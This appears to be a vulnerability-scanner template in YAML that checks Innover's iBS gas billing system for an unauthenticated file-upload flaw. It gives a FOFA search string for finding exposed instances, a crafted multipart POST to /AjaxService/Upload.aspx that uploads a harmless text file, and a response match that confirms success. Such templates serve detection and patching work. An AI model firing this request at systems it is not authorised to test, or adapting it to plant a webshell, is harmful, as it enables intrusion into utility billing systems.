id: innover-ibs-ajaxservice-fileupload

info:
  name: 先锋 WEB 燃气收费系统文件上传漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    智慧燃气业务云平台，简称iBS（Innover Business System），是先锋电子创新研发的智慧燃气营收业务管理云平台。它全面、灵活的满足了客户关系管理和核心业务需求。系统支持客户档案的统一管理，普表、IC卡表、物联网表的多类型表具管理，支持市场主流IC卡表、物联网表的接入运营。系统涵盖用户管理、抄表管理、收费管理、财务报表、监控分析、多种渠道服务等各业务应用，实现了各种业务功能、各个服务场景之间的有机协同。
    fofa: app="先锋WEB燃气收费系统"
  reference:
    - http://www.innover.com.cn/
    - https://mp.weixin.qq.com/s?__biz=MzIyNzU2NDIwOA==&mid=2247488683&idx=2&sn=6cb6d6c1c12b345b7672b92eedce5203
  tags: innover,ibs,fileupload
  created: 2024/01/16

set:
  rboundary: randomLowercase(8)
  filename: randomLowercase(6)
  folder: year(0) + month(0)
rules:
  r0:
    request:
      method: POST
      path: /AjaxService/Upload.aspx
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"Fdata\"; filename=\"{{filename}}.txt\"\r\n\
        Content-Type: image/jpeg\r\n\
        \r\n\
        test\r\n\
        \r\n\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"submit\"\r\n\
        \r\n\
        submin\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: |
      response.status == 200 &&
      response.body.bcontains(bytes('\\UploadFile\\'+folder+'\\')) && 
      response.body.bcontains(b'.txt')
expression: r0()
